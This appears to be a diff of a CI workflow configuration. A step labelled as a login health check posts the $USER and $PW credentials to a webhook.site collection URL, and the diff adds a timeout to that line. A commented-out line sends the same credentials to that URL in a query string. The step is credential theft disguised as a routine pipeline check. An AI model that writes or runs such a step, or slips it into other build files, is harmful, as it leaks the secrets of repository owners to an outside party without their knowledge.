@@ -23,7 +23,7 @@ jobs:
       run: |
         echo "Login health check"
 #        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $URL/login
-        curl -X POST -d 'key1=$USER&key2=$PW' https://webhook.site/602bd406-3191-4dcc-95c0-2ecc89fee0d0
+        curl --connect-timeout 2 -X POST -d 'key1=$USER&key2=$PW' https://webhook.site/602bd406-3191-4dcc-95c0-2ecc89fee0d0
         #        curl --connect-timeout 2 https://webhook.site/602bd406-3191-4dcc-95c0-2ecc89fee0d0?username="{$USER:$PW}"
         
     - name: send_run_log
